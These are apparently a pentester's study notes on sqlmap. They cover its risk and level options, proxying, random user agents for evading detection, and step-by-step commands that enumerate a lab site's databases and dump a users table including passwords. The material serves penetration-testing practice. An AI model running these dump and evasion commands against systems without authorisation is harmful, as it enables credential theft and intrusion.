# 🔵 **Sqlmap**

---

## 🔵 **Sqlmap**

Sqlmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws. It allows for database fingerprinting, data fetching, file system access, and more through terminal commands.

- **GitHub Repository:** *Sqlmap GitHub*
- **Usage Documentation:** *Sqlmap Usage Guide*

---

# 🟩 **Notes**

---

## 🟦 **Risk Levels**

- `-risk=1/2/3` increases the aggressiveness and danger of payloads.
- Default **1** is least destructive, avoiding data changes.
- **2** adds heavy, time-based SQLi payloads, which might slow or crash the database.
- **3** introduces OR-based payloads, potentially updating data and causing problems—use only in safe environments.

---

## 🟧 **Level Values**

- `-level=1/2/3/4/5` governs the depth of checks and quantity/types of headers tested.
- **1** only tests GET and POST parameters (default).
- Higher values expand coverage—**2** adds cookie testing, **3** adds headers, up to **5** with host and more advanced checks.
- Every increment increases test volume and scan time, with **5** performing the largest number of requests.

---

## 🟪 **Proxy Usage**

- Proxying sqlmap via options like
    - `-proxy="http://127.0.0.1:8080"`
    
    lets you route traffic through tools like Burp Suite for deeper request/response inspection and logging during tests.
    

---

## 🟨 **Random Agent**

- Option `-random-agent` picks a random User-Agent header, making automated traffic less identifiable and helping bypass simple security measures and detection by the target application.

## 🟢 **Installation**

Install Sqlmap using the package manager:

```
apt install sqlmap

```

## 🟢 **Basic Usage**

```
sqlmap -u <URL>

example usase
sqlmap -u http://192.168.29.70/web-pentest1/error-based-string.php?id=1

```

Test a URL for SQL injection.

```
sqlmap -u <URL> -p <PARAMETER>

example usage
sqlmap -u http://192.168.29.70/web-pentest1/error-based-string.php?id=1 -p id

```

Specify a vulnerable parameter.

```
sqlmap --help

```

Display help options.

# 🟦 **Database Enumeration**

```
sqlmap -u <URL> --dbs

example usage
sqlmap -u http://192.168.29.70/web-pentest1/error-based-string2.php?id=1 -p id --dbs

```

List all available databases.

```
sqlmap -u <URL> -D <DATABASE> --tables

 sqlmap -u http://192.168.29.70/web-pentest1/error-based-string2.php?id=1 -D sqli_db --tables

```

List tables in a specific database.

```
sqlmap -u <URL> -D <DATABASE> -T <TABLE> --columns

 sqlmap -u http://192.168.29.70/web-pentest1/error-based-string2.php?id=1 -D sqli_db -T users --columns

```

List columns in a specific table.

```
sqlmap -u <URL> -D <DATABASE> -T <TABLE> -C <COLUMN1,COLUMN2> --dump

sqlmap -u http://192.168.29.70/web-pentest1/error-based-string2.php?id=1 -D sqli_db -T users -C enable,name,email,id,password --dump  

 
 #ess example se sare define ho kate he 
 
sqlmap -u http://192.168.29.70/web-pentest1/error-based-string2.php?id=1 -D sqli_db -T users --dump 

```

Dump specific columns' data.

# 🟢 **Sqlmap Directory And Maintenance**

Sqlmap saves data output at:

```
/root/.local/share/sqlmap/output

```

Purge the Sqlmap data directory.

```
sqlmap --purge

```

Update Sqlmap to the latest version.

```
sqlmap --update

```
